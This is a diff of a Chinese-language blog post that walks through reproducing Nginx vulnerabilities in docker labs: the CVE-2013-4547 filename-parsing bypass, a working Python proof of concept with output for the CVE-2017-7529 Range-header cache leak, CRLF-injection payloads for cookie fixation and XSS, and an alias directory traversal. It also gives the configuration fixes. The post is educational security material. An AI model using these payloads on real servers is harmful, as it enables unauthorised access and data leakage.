@@ -6,13 +6,13 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="前言Nginx 是一款轻量级的 Web 服务器、反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个 BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上 nginx 的并发能力确实在同类型的网页服务器中表现较好。 文件名逻辑漏洞(CVE-2013-4547)漏洞说明影响版本 Nginx 0.8.41 ~ 1.4.3  /  1.5.0 ~ 1.5.7 漏洞说明 这个">
+    <meta name="description" content="前言Nginx 是一款轻量级的 Web 服务器、反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个 BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上 nginx 的并发能力确实在同类型的网页服务器中表现较好。 文件名逻辑漏洞(CVE-2013-4547)漏洞说明影响版本1Nginx 0.8.41 ~ 1.4.3  /  1.5.0 ~ 1.5.7 漏洞说明 这个">
 <meta name="keywords" content="漏洞复现">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Nginx漏洞复现">
 <meta property="og:url" content="http://imysec.github.io/2019/07/31/nginx-lou-dong-fu-xian/index.html">
 <meta property="og:site_name" content="忆时光">
-<meta property="og:description" content="前言Nginx 是一款轻量级的 Web 服务器、反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个 BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上 nginx 的并发能力确实在同类型的网页服务器中表现较好。 文件名逻辑漏洞(CVE-2013-4547)漏洞说明影响版本 Nginx 0.8.41 ~ 1.4.3  /  1.5.0 ~ 1.5.7 漏洞说明 这个">
+<meta property="og:description" content="前言Nginx 是一款轻量级的 Web 服务器、反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个 BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上 nginx 的并发能力确实在同类型的网页服务器中表现较好。 文件名逻辑漏洞(CVE-2013-4547)漏洞说明影响版本1Nginx 0.8.41 ~ 1.4.3  /  1.5.0 ~ 1.5.7 漏洞说明 这个">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://imysec.github.io/2019/07/31/nginx-lou-dong-fu-xian/1.png">
 <meta property="og:image" content="http://imysec.github.io/2019/07/31/nginx-lou-dong-fu-xian/2.png">
@@ -31,7 +31,7 @@
 <meta property="og:updated_time" content="2019-08-19T07:52:48.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Nginx漏洞复现">
-<meta name="twitter:description" content="前言Nginx 是一款轻量级的 Web 服务器、反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个 BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上 nginx 的并发能力确实在同类型的网页服务器中表现较好。 文件名逻辑漏洞(CVE-2013-4547)漏洞说明影响版本 Nginx 0.8.41 ~ 1.4.3  /  1.5.0 ~ 1.5.7 漏洞说明 这个">
+<meta name="twitter:description" content="前言Nginx 是一款轻量级的 Web 服务器、反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个 BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上 nginx 的并发能力确实在同类型的网页服务器中表现较好。 文件名逻辑漏洞(CVE-2013-4547)漏洞说明影响版本1Nginx 0.8.41 ~ 1.4.3  /  1.5.0 ~ 1.5.7 漏洞说明 这个">
 <meta name="twitter:image" content="http://imysec.github.io/2019/07/31/nginx-lou-dong-fu-xian/1.png">
     
     
@@ -173,141 +173,49 @@
 
   <div class="content" itemprop="articleBody">
     <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Nginx 是一款轻量级的 Web 服务器、反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个 BSD-like 协议下发行。其特点是占有内存少，并发能力强，事实上 nginx 的并发能力确实在同类型的网页服务器中表现较好。</p>
-<h1 id="文件名逻辑漏洞-CVE-2013-4547"><a href="#文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="文件名逻辑漏洞(CVE-2013-4547)"></a>文件名逻辑漏洞(CVE-2013-4547)</h1><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p><strong>影响版本</strong></p>
-<pre><code>Nginx 0.8.41 ~ 1.4.3  /  1.5.0 ~ 1.5.7
-</code></pre><p><strong>漏洞说明</strong></p>
+<h1 id="文件名逻辑漏洞-CVE-2013-4547"><a href="#文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="文件名逻辑漏洞(CVE-2013-4547)"></a>文件名逻辑漏洞(CVE-2013-4547)</h1><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p><strong>影响版本</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nginx 0.8.41 ~ 1.4.3  /  1.5.0 ~ 1.5.7</span><br></pre></td></tr></table></figure></p>
+<p><strong>漏洞说明</strong></p>
 <p>这个漏洞其实和代码执行没有太大关系，其主要是因为错误地解析了请求的 URL ，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。</p>
 <p><strong>举个例子</strong></p>
-<p>Nginx匹配到 <code>.php</code> 结尾的请求，就发送给 fastcgi 进行解析，常见的写法如下：</p>
-<pre><code>location ~ \.php$ {
-    include        fastcgi_params;
-
-    fastcgi_pass   127.0.0.1:9000;
-    fastcgi_index  index.php;
-    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;
-    fastcgi_param  DOCUMENT_ROOT /var/www/html;
-}
-</code></pre><p>正常情况下(关闭pathinfo的情况下)，只有.php后缀的文件才会被发送给fastcgi解析</p>
+<p>Nginx匹配到 <code>.php</code> 结尾的请求，就发送给 fastcgi 进行解析，常见的写法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line"></span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;</span><br><span class="line">    fastcgi_param  DOCUMENT_ROOT /var/www/html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>正常情况下(关闭pathinfo的情况下)，只有.php后缀的文件才会被发送给fastcgi解析</p>
 <p>而存在CVE-2013-4547的情况下，我们构造payload：<code>http://127.0.0.1/test.jpg[0x20][0x00].php</code><br>注意： 0x20指 (空格)、 0x00指<code>\0</code>(截止符)、 还有一个0x2e指分隔符</p>
 <p>这个URL可以匹配上正则 <code>\.php$</code> ，可以进入这个Location块；但进入之后，Nginx却错误地认为请求的文件是 <code>test.jpg[0x20]</code> ，就设置其为<code>SCRIPT_FILENAME</code>的值发送给 fastcgi 。</p>
 <p>fastcgi根据<code>SCRIPT_FILENAME</code>的值进行解析，最后造成了解析漏洞。</p>
 <p>所以，我们只需要上传一个空格结尾的文件，即可使PHP解析之。</p>
 <p><strong>再举个例子</strong></p>
-<p>比如很多网站限制了允许访问后台的IP：</p>
-<pre><code>location /admin/ {
-    allow 127.0.0.1;
-    deny all;
-}
-</code></pre><p>我们可以请求如下URL： <code>/test[0x20]/../admin/index.php</code> ，这个URI不会匹配上location后面的 <code>/admin/</code> ，也就绕过了其中的IP验证；但最后请求的是 <code>/test[0x20]/../admin/index.php</code> 文件，也就是<code>/admin/index.php</code>，成功访问到后台。<br>（<strong>注意：</strong>这个前提是需要有一个目录叫<code>test</code>：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制）</p>
+<p>比如很多网站限制了允许访问后台的IP：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location /admin/ &#123;</span><br><span class="line">	allow 127.0.0.1;</span><br><span class="line">	deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们可以请求如下URL： <code>/test[0x20]/../admin/index.php</code> ，这个URI不会匹配上location后面的 <code>/admin/</code> ，也就绕过了其中的IP验证；但最后请求的是 <code>/test[0x20]/../admin/index.php</code> 文件，也就是<code>/admin/index.php</code>，成功访问到后台。<br>（<strong>注意：</strong>这个前提是需要有一个目录叫<code>test</code>：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制）</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动漏洞环境：</p>
-<pre><code>docker-compose build
-docker-compose up -d
-</code></pre><p>靶机IP： <code>192.168.220.141</code><br>环境启动后，访问<code>http://192.168.220.141:8080/</code>即可看到一个上传页面。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>靶机IP： <code>192.168.220.141</code><br>环境启动后，访问<code>http://192.168.220.141:8080/</code>即可看到一个上传页面。</p>
 <p><img src="/2019/07/31/nginx-lou-dong-fu-xian/1.png" alt=""></p>
 <p>这个环境是黑名单验证，我们无法上传php后缀的文件，需要利用CVE-2013-4547。我们上传一个<code>123.jpg</code>，<strong>注意后面的空格</strong></p>
 <p><img src="/2019/07/31/nginx-lou-dong-fu-xian/2.png" alt=""></p>
 <p>上传成功，尝试去该路径下访问“123.jpg ”文件，界面报404错误</p>
 <p><img src="/2019/07/31/nginx-lou-dong-fu-xian/3.png" alt=""></p>
 <p>上传的文件找不到，是因为浏览器自动将空格编码为%20，服务器中找不到名为“test2.jpg%20”的文件</p>
-<p>接下来，我们想要上传的jpg文件作为php解析，就需要利用未编码的空格和截止符（\0）进行构造，构造请求如下：</p>
-<pre><code>http://192.168.220.141:8080/uploadfiles/test.jpgAA.php
-#AA只是起到占位的作用
-</code></pre><p>发送请求并使用burpsuite抓包。使用burpsuite将AA分别更改为20（空格）、00（截止符\0）</p>
-<p>这样我们发送的请求就变为：</p>
-<pre><code>http://192.168.220.141:8080/uploadfiles/test.jpg[0x20][0x00].php
-</code></pre><p>Nginx解析后，将“test.jpg ”文件当做php文件解析。</p>
+<p>接下来，我们想要上传的jpg文件作为php解析，就需要利用未编码的空格和截止符（\0）进行构造，构造请求如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.220.141:8080/uploadfiles/test.jpgAA.php</span><br><span class="line">#AA只是起到占位的作用</span><br></pre></td></tr></table></figure></p>
+<p>发送请求并使用burpsuite抓包。使用burpsuite将AA分别更改为20（空格）、00（截止符\0）</p>
+<p>这样我们发送的请求就变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.220.141:8080/uploadfiles/test.jpg[0x20][0x00].php</span><br></pre></td></tr></table></figure></p>
+<p>Nginx解析后，将“test.jpg ”文件当做php文件解析。</p>
 <p><img src="/2019/07/31/nginx-lou-dong-fu-xian/4.png" alt=""></p>
 <h1 id="越界读取缓存漏洞-CVE-2017-7529"><a href="#越界读取缓存漏洞-CVE-2017-7529" class="headerlink" title="越界读取缓存漏洞(CVE-2017-7529)"></a>越界读取缓存漏洞(CVE-2017-7529)</h1><h2 id="漏洞说明-1"><a href="#漏洞说明-1" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括 “文件头”+“HTTP返回包头”+“HTTP返回包体” 。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。</p>
 <p>如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。</p>
-<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre><code>docker-compose up -d
-</code></pre><p>靶机IP： <code>192.168.220.150</code></p>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>靶机IP： <code>192.168.220.150</code></p>
 <p>访问 <code>192.168.220.150:8080</code> ，即可查看到Nginx默认页面，这个页面实际上是反向代理的8081端口的内容。</p>
 <p>调用<code>python3 poc.py http://your-ip:8080/</code>，读取返回结果：</p>
-<p>poc.py(基于python3)</p>
-<pre><code>#!/usr/bin/env python
-import sys
-import requests
-
-if len(sys.argv) &lt; 2:
-    print(&quot;%s url&quot; % (sys.argv[0]))
-    print(&quot;eg: python %s http://your-ip:8080/&quot; % (sys.argv[0]))
-    sys.exit()
-
-headers = {
-    &#39;User-Agent&#39;: &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&quot;
-}
-offset = 605  # 可以修改
-url = sys.argv[1]
-file_len = len(requests.get(url, headers=headers).content)
-n = file_len + offset
-headers[&#39;Range&#39;] = &quot;bytes=-%d,-%d&quot; % (
-    n, 0x8000000000000000 - n)
-
-r = requests.get(url, headers=headers)
-print(r.text)
-</code></pre><p>执行结果：</p>
-<pre><code>root@kali:~# python3 poc.py http://192.168.220.150:8080/
-
---00000000000000000006
-Content-Type: text/html; charset=utf-8
-Content-Range: bytes -605-611/612
-
-’;A]b`RY:9A]r«\me&quot;59526062-264&quot;  ##
-KEY: http://127.0.0.1:8081/      ## 缓存文件头
-
-## HTTP返回头
-HTTP/1.1 200 OK
-Server: nginx/1.13.2
-Date: Wed, 31 Jul 2019 06:46:18 GMT
-Content-Type: text/html; charset=utf-8
-Content-Length: 612
-Last-Modified: Tue, 27 Jun 2017 13:40:50 GMT
-Connection: close
-ETag: &quot;59526062-264&quot;
-Accept-Ranges: bytes
-
-&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-&lt;title&gt;Welcome to nginx!&lt;/title&gt;
-&lt;style&gt;
-    body {
-        width: 35em;
-        margin: 0 auto;
-        font-family: Tahoma, Verdana, Arial, sans-serif;
-    }
-&lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;
-&lt;p&gt;If you see this page, the nginx web server is successfully installed and
-working. Further configuration is required.&lt;/p&gt;
-
-&lt;p&gt;For online documentation and support please refer to
-&lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;
-Commercial support is available at
-&lt;a href=&quot;http://nginx.com/&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-
---00000000000000000006
-Content-Type: text/html; charset=utf-8
-Content-Range: bytes -9223372036854773979-611/612
-</code></pre><p>可见，越界读取到了位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。</p>
-<h1 id="配置错误导致漏洞"><a href="#配置错误导致漏洞" class="headerlink" title="配置错误导致漏洞"></a>配置错误导致漏洞</h1><pre><code>docker-compose up -d
-</code></pre><p>运行成功后，Nginx将会监听8080/8081/8081三个端口，分别对应三种漏洞。</p>
-<pre><code>1. CRLF注入漏洞
-2. 目录穿越漏洞
-3. add_header被覆盖
-</code></pre><h2 id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h2><h3 id="漏洞说明-2"><a href="#漏洞说明-2" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>CRLF是回车换行(\r\n)的简称，其十六进制的编码分别是0x0b和0x0a。<br>在http协议中，http消息头以明文的字符串格式传送，以冒号分隔的键/值对，如：Accept-Charset: utf-8，每一个消息头以回车符(CR)和换行符(LF)结尾。而在http消息头结束后，会使用两个连续的CR-LF来进行标识，用来分隔http 消息头 和 http 消息体（请求或响应的内容）。</p>
+<p>poc.py(基于python3)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &lt; 2:</span><br><span class="line">    print(&quot;%s url&quot; % (sys.argv[0]))</span><br><span class="line">    print(&quot;eg: python %s http://your-ip:8080/&quot; % (sys.argv[0]))</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &apos;User-Agent&apos;: &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&quot;</span><br><span class="line">&#125;</span><br><span class="line">offset = 605  # 可以修改</span><br><span class="line">url = sys.argv[1]</span><br><span class="line">file_len = len(requests.get(url, headers=headers).content)</span><br><span class="line">n = file_len + offset</span><br><span class="line">headers[&apos;Range&apos;] = &quot;bytes=-%d,-%d&quot; % (</span><br><span class="line">    n, 0x8000000000000000 - n)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p>
+<p>执行结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# python3 poc.py http://192.168.220.150:8080/</span><br><span class="line"></span><br><span class="line">--00000000000000000006</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Range: bytes -605-611/612</span><br><span class="line"></span><br><span class="line">’;A]b`RY:9A]r«\me&quot;59526062-264&quot;  ##</span><br><span class="line">KEY: http://127.0.0.1:8081/      ## 缓存文件头</span><br><span class="line"></span><br><span class="line">## HTTP返回头</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.13.2</span><br><span class="line">Date: Wed, 31 Jul 2019 06:46:18 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 612</span><br><span class="line">Last-Modified: Tue, 27 Jun 2017 13:40:50 GMT</span><br><span class="line">Connection: close</span><br><span class="line">ETag: &quot;59526062-264&quot;</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Welcome to nginx!&lt;/title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    body &#123;</span><br><span class="line">        width: 35em;</span><br><span class="line">        margin: 0 auto;</span><br><span class="line">        font-family: Tahoma, Verdana, Arial, sans-serif;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;If you see this page, the nginx web server is successfully installed and</span><br><span class="line">working. Further configuration is required.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;For online documentation and support please refer to</span><br><span class="line">&lt;a href=&quot;http://nginx.org/&quot;&gt;nginx.org&lt;/a&gt;.&lt;br/&gt;</span><br><span class="line">Commercial support is available at</span><br><span class="line">&lt;a href=&quot;http://nginx.com/&quot;&gt;nginx.com&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">--00000000000000000006</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Range: bytes -9223372036854773979-611/612</span><br></pre></td></tr></table></figure></p>
+<p>可见，越界读取到了位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。</p>
+<h1 id="配置错误导致漏洞"><a href="#配置错误导致漏洞" class="headerlink" title="配置错误导致漏洞"></a>配置错误导致漏洞</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>运行成功后，Nginx将会监听8080/8081/8081三个端口，分别对应三种漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. CRLF注入漏洞</span><br><span class="line">2. 目录穿越漏洞</span><br><span class="line">3. add_header被覆盖</span><br></pre></td></tr></table></figure>
+<h2 id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h2><h3 id="漏洞说明-2"><a href="#漏洞说明-2" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>CRLF是回车换行(\r\n)的简称，其十六进制的编码分别是0x0b和0x0a。<br>在http协议中，http消息头以明文的字符串格式传送，以冒号分隔的键/值对，如：Accept-Charset: utf-8，每一个消息头以回车符(CR)和换行符(LF)结尾。而在http消息头结束后，会使用两个连续的CR-LF来进行标识，用来分隔http 消息头 和 http 消息体（请求或响应的内容）。</p>
 <p>当一个网站使用https协议的时候，很多站点会强制用户使用https进行访问。当用户访问http的时候会302跳转到https页面。<br>如果使用了 \$uri来进行配置，可能会导致CRLF注入漏洞</p>
-<p>Nginx中错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）：</p>
-<pre><code>location / {
-    return 302 https://$host$uri;
-}
-</code></pre><p>nginx中     <code>\$uri</code> 指的是请求的文件和路径，不会包含后面请求的数据（即?和#后面的数据）</p>
+<p>Nginx中错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    return 302 https://$host$uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>nginx中     <code>\$uri</code> 指的是请求的文件和路径，不会包含后面请求的数据（即?和#后面的数据）</p>
 <p>nginx服务器会对 <code>$uri</code> 进行解码。当我们在传入的参数后面加入urlencode之后的换行符 <code>%0d%0a</code> ，我们就可以污染HTTP头的数据</p>
 <p><strong>举个例子</strong><br>访问<code>http://your_ip/302/123</code>会302跳转到<code>https://your_ip/302/123</code>。这是正常的跳转。<br>但是由于配置文件里面使用的是<code>$uri</code>，会对我们传入的参数进行转码，当我们访问<code>http://your_ip/302/123%0d%0a%0d%0atest=1</code>时，302跳转会指向<code>https://your_ip/302/123</code>并且POST一个参数 <code>test=1</code></p>
 <h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>正常发送请求</p>
@@ -316,14 +224,14 @@ Content-Range: bytes -9223372036854773979-611/612
 <ol>
 <li><p>会话固定</p>
 <p>构造payload</p>
-<pre><code>http://192.168.220.150:8080/%0d%0aSet-Cookie:%20session=hacker
-</code></pre><p><img src="/2019/07/31/nginx-lou-dong-fu-xian/6.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.220.150:8080/%0d%0aSet-Cookie:%20session=hacker</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/31/nginx-lou-dong-fu-xian/6.png" alt=""></p>
 <p>可以从响应包中看出，我们利用该漏洞成功了控制了cookie</p>
 </li>
 <li><p>反射型XSS</p>
 <p>构造payload</p>
-<pre><code>http://192.168.220.150:8080/%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;
-</code></pre><p><img src="/2019/07/31/nginx-lou-dong-fu-xian/7.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.220.150:8080/%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/31/nginx-lou-dong-fu-xian/7.png" alt=""></p>
 <p>我们可以看到响应包中，标签已经插入页面中，但是由于浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。<br>怎样才能关掉filter？一般来说用户这边是不行的，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter。</p>
 <p>还没成功！！！</p>
 </li>
@@ -334,86 +242,50 @@ Content-Range: bytes -9223372036854773979-611/612
 <li>$document_uri：表示解码以后的请求路径（不带参数）</li>
 <li>$request_uri：表示完整的uri，没有解码</li>
 </ul>
-<p>所以修复该漏洞，我们需要将配置文件改为：</p>
-<pre><code>location / {
-    return 302 https://$host$request_uri;
-}
-</code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
+<p>所以修复该漏洞，我们需要将配置文件改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    return 302 https://$host$request_uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
 <li><a href="https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html</a></li>
 <li><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a></li>
 </ol>
 <h2 id="目录穿越漏洞"><a href="#目录穿越漏洞" class="headerlink" title="目录穿越漏洞"></a>目录穿越漏洞</h2><h3 id="漏洞说明-3"><a href="#漏洞说明-3" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><p>Nginx在配置别名（Alias）的时候，如果忘记加<code>/</code>，将造成一个目录穿越漏洞。</p>
 <p>错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：</p>
-<pre><code>location /files {
-    alias /home/;
-}
-</code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问files目录，构造payload：</p>
-<pre><code>http://192.168.220.150:8081/files
-</code></pre><p><img src="/2019/07/31/nginx-lou-dong-fu-xian/8.png" alt=""></p>
-<p>目录穿越到根目录,构造payload：</p>
-<pre><code>http://192.168.220.150:8081/files../
-</code></pre><p><img src="/2019/07/31/nginx-lou-dong-fu-xian/9.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">location /files &#123;</span><br><span class="line">	alias /home/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
